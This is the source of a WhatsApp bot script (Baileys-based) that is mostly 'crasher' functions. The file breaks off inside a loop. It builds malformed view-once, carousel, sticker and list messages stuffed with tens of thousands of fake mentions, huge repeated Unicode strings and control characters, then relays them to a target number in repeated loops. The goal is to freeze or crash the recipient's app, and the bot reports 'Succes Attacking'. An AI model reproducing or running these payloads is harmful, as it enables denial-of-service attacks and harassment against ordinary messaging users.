require('./config');
const fs = require('fs');
const axios = require('axios');
const jimp = require("jimp")
const util = require("util");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const { spawn, exec, execSync } = require('child_process');
const path = require('path')
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContetInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, chalk, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');

module.exports = async (gon, m) => {
try {
const body = (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) ? (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) : '';

const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (gon.user.id.split(':')[0]+'@s.whatsapp.net' || gon.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await gon.decodeJid(gon.user.id)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const owner = JSON.parse(fs.readFileSync('./lib/database/owner.json'));

const premium = JSON.parse(fs.readFileSync('./lib/database/premium.json'));    
const isCreator = await gon.decodeJid(gon.user.id);
const isPremium = premium.includes(m.sender)

const isOwner = [isCreator, ...owner, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)    
const groupMetadata = isGroup ? await gon.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(isCreator) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(isCreator) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');



let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let gonaja = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return gonaja
}
const fkontak = {
  key: {
    fromMe: false,
    participant: "6282197991725@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: { Url: "https://b.top4top.io/p_3453keohe1.jpg" },
      itemCount: "2010",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Gonzales Simple Crasher`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["6282197991725@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
  
const PayX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "286383638363",
					"thumbnail": { Url: "https://b.top4top.io/p_3453keohe1.jpg" },
					"thumbnailUrl": "https://b.top4top.io/p_3453keohe1.jpg",
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Sender : @${pushname}\nCommand : ${command}`,
					"orderTitle": "© Dapsz-ID",
					"sellerJid": "6282197991725@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "USD"
				}
			}
		}

//Done Resp
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = `
— ⧼ \`Succes Attacking\` ⧽ —
╭─────────────⌑
│ Sender : ${pushname}
│ Target : ${pepec}
│ Command : ${command}
╰─────────────⊱

\`\`\`please pause 5 minutes\`\`\`` 

let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "back" } }
    ];

    let buttonMessage = {
        image: {url: "https://files.catbox.moe/po9061.jpg"},
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363419057657291@newsletter",
                newsletterName: "Gonzz Serba Ada"
            }
        },
        footer: global.footer,
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await gon.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
} 
//Proses Respone
 async function prosesress () {
if (!q) throw "Proses Response"
let pepec = q.replace(/[^0-9]/g, "")
let prosesres = `
— ⧼ \`Proses Attacking\` ⧽ —
╭─────────────⊱
│ Target : ${pepec}
│ Status : proses attacking
╰─────────────⊱

\`\`\`proses attacking, wait a moment\`\`\`` 

let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "back" } }
    ];

    let buttonMessage = {
        image: {url: "https://files.catbox.moe/po9061.jpg"},
        caption: prosesres,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363419057657291@newsletter",
                newsletterName: "Gonzz Serba Ada"
            }
        },
        footer: global.footer,
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await gon.sendMessage(m.chat, buttonMessage, { quoted: PayX });
}

//Function bug
//Func Combo CarouselXForCloseXDelaySuperXBulldozer
//Creator: Dapsz-ID
//BANTU SHARE, BIAR GK DI JUAL ANAK JB.
async function DapszXcombo(target, mention) {
  //Isi Script Carousel
  for (let i = 0; i < 1020; i++) {
        try {
            let push = [];
            for (let i = 0; i < 1020; i++) {
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: '*DapszXvictus*',
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                            fileLength: "10840",
                            height: 10,
                            width: 10,
                            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1721344123",
                            jpegThumbnail: ""
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
                });
            }
        //Isi Script ForClose
        let forCLOSE = JSON.stringify({
    status: true,
    criador: "Gonzales Dari selatan",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
 });
     //Script DelaySuper
     const DelayMSG = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "DapszCrasher",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };
    //Sticker Berat Bulldozer
    const stickerBulldozer = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
     //Mengirim  Carousel Dulu
     const carousel = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ text: `${"𑜦".repeat(40000)}Gonzales Dari Selatan\n\u0000` }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: "About Me: bio.link/crash" }),
                            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
                        })
                    }
                }
            }, {});
          //Lalu Mengirim forCLOSE
          let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Gonzxx",
              newsletterJid: "33333333333333333@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "DapszXvictus - Crash",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://youtube.com/gonSamp",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "DapszXvictus",
              hasMediaAttachment: false
            },
            body: {
              text: "DapszXvictus",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: forCLOSE + "About : https://t.me/dapszoffc",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: forCLOSE + "About : https://t.me/dapszoffc",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: forCLOSE + "About : https://t.me/dapszoffc"
                },
                {
                  name: "payment_status",
                  buttonParamsJson: forCLOSE + "About : https://t.me/dapszoffc"
                },
                {
                  name: "review_order",
                  buttonParamsJson: forCLOSE + "About : https://t.me/dapszoffc"
                },
              ],
            },
          },
        },
      },
    },
    {}
  );
  //Carousel
  await gon.relayMessage(target, carousel.message, {
                participant: { jid: target }
            });
        } catch (err) {
            console.error("Error in Fkod:", err);
        }
    }
            //Lalu forCLOSE
  await gon.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  //DelaySuper
  const DelayMsg = generateWAMessageFromContent(target, DelayMSG, {});

    await gon.relayMessage("status@broadcast", DelayMsg.message, {
        messageId: DelayMsg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await gon.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: DelayMsg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "ꦾꦾꦾ" },
                        content: undefined
                    }
                ]
            }
        );
    }
    const stickerMSG = generateWAMessageFromContent(target, stickerBulldozer, {});
    await gon.relayMessage("status@broadcast", stickerMSG.message, {
    messageId: stickerMSG.key.id,
    statusJidList: [target],
    });
}
async function DelaySsuper(target, mention) {
    console.log("DapszSimpleCrasher Attacking");
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "DapszCrasher",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await gon.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await gon.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "ꦾꦾꦾ" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function delayInvisDapsz(target) {
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "DapszInvis",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "☠️" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "( # )"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await gon.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}
async function DelayInVis(target, show) {
            let push = [];
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: "#dapsz-id" }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "#dapsz-id" }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "#dapsz-id",
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                            fileLength: "18352",
                            height: 720,
                            width: 1280,
                            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1737281900",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                            scanLengths: [3537, 10557, 1905, 2353],
                            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
                        },
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
                });
        
            let msg = await generateWAMessageFromContent(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: "Dapsz-ID" }),
                                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
                            }),
                        },
                    },
                },
                {}
            );
        
            await gon.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await gon.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "Dapsz-ID X Invis" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
  async function delayMakerInvisDapsz(target) {
    console.log(`[LOG] ${target}`);

    let gonData = JSON.stringify({
        status: true,
        criador: "Dapsz-ID",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    sockCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnsockCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: ` Dapsz-ID ${"Dapsz DelayMaker".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `Dapsz | Invisible""""" ${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["72538363837@s.whatsapp.net"],
                    },
                    body: {
                        text: "\u0003" + "ꦽ".repeat(102002) + "\u0003".repeat(102002)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: gonData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "review_order", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "send_location", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "view_product", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "address_message", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "mpm", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: gonData + "\u0003".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: gonData + "\u0003".repeat(9999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await gon.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[SUCCESS] ${target}`);
}
const tolbug2 = 100;
async function DapszCombo(target) {
    for (let i = 0; i < tolbug2; i++) {
    await DapszXcombo(target, true) 
    await DapszXcombo(target, true) 
    await DapszXcombo(target, true) 
    await DapszXcombo(target, true) 
    await DapszXcombo(target, true) 
    await DapszXcombo(target, true) 
